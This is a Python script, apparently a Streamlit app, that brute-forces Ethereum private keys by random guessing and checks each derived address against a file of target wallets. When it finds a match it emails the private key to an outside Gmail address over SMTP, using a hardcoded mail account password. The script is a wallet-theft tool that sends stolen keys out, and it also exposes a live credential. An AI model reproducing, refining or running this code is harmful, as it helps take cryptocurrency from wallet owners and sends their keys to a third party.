
import time
import threading
from sha3 import keccak_256
from coincurve import PublicKey
import random
import string
import smtplib
from email.message import EmailMessage
import streamlit as st

wallets = open('dompet.txt').read().__str__()

def eth1():
    for i in range(1000000000000):
        t_time = time.time() - start
        bits = int(''.join(random.choices(string.digits, k=77))) #['0','1','2','3','4','5','6','7','8','9']
        #bits = int(82468108135797135686070246860242547516113575113143640500246400213263141123331)
        key = hex(bits)[2:]
        if len(key) != 64:
            key = 'e' * (64 - len(key)) + key
        private_key = bytes.fromhex(key)
        public_key = PublicKey.from_secret(private_key).format(compressed=False)[1:]
        address = keccak_256(public_key).digest()[-20:]
        addr = address.hex()
        #addr = '0x' + address.hex()

        if str(addr) in wallets:
            msg = EmailMessage()
            msg['Subject'] = 'Ditemukan'
            msg['From'] = 'satufandome@idpeta.com'
            msg['To'] = 'lootingnc@gmail.com'

            msg.set_content(str(i) + " " + str(key) + " " + str(private_key) + " " + str(public_key) + " " + str(address) + " " + addr + " " + str(bits) + "\n")

            with smtplib.SMTP_SSL('mail.idpeta.com', 465) as smtp:
                smtp.login('satufandome@idpeta.com', 'm&q$~nXw+DFR')
                smtp.send_message(msg)

if __name__ == "__main__":
    start = time.perf_counter()
    # create threads
    t1 = threading.Thread(target=eth1)

    # start thread
    t1.start()

    # wait until thread 1 is completely executed
    t1.join()

    # both threads completely executed
    finish = time.perf_counter()
    st.write("Total time= {} second".format(finish-start))
